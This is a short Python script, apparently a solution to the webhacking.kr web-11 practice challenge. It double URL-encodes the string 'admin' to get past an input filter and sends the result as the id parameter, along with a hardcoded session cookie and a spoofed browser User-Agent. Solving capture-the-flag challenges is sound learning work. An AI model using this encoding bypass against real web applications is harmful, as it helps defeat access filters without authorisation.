import requests
from urllib.parse import quote

s = "admin"
o=""
for i in s:
    o += '%'+str(hex(ord(i)))[2:]

print(o)

cookies = {'PHPSESSID': '85avojnegh4drhgh3ihv9pvmlq'}

o = quote(o) 

"""
or 
p=""
for i in o:
    p += '%'+str(hex(ord(i)))[2:]

print(f"o = {o}, p = {p}")
"""

print(o)

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
ret = requests.get(f"https://webhacking.kr/challenge/web-11/?id={o}", cookies=cookies, headers=headers)


print(ret.text)
